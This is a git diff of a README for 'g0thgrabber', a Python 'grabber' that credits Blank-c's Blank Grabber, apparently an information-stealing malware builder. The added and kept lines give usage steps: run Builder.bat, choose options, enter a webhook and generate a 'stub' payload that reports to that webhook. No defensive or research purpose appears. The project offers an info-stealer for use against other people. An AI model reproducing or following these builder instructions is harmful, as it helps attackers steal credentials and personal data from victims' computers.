@@ -4,9 +4,15 @@
 
 <p align="left"> <a href="https://twitter.com/xeniight" target="blank"><img src="https://img.shields.io/twitter/follow/xeniight?logo=twitter&style=for-the-badge" alt="xeniight" /></a> </p>
 
+## Brief Overview
+- A simple Python grabber.
+
+## NOTICE!
+- This project is based on Blank-c's Blank Grabber, but as of August 2023 it was discontinued, as well as the forked version.
+- Credits to Blank-c and contributors. I used the project as a template and improved it.
+
 # INSTRUCTIONS
 - you need python 3.10+ - i used [python 3.11.6](https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe)
-- download the repo [here](https://github.com/g0T-h/g0thgrabber/releases/download/1.7.2/g0thgrabber.zip)
 
 - run Builder.bat or it won't work.
 - when the gui appears, select your desired options, put your webhook click on generate, give it some time and your stub will appear.
